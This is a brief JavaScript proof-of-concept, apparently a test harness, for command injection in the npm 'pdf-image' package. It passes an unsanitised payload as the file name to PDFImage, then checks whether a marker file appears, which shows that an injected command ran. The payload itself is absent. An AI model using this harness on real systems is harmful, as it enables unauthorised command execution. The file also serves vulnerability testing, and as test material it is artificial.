function exploitFunction(payload) {
  const PDFImage = require("pdf-image").PDFImage;
  const fs = require("fs");
  const path = "./pdf-image";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  let pdfImage = new PDFImage(payload); // Directly use the payload

  try {
    return pdfImage.numberOfPages().then(function (imagePath) {
      const file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlinkSync(path); // Use fs.unlinkSync for simplicity
    });
  } catch (e) {}
}

module.exports = { exploitFunction };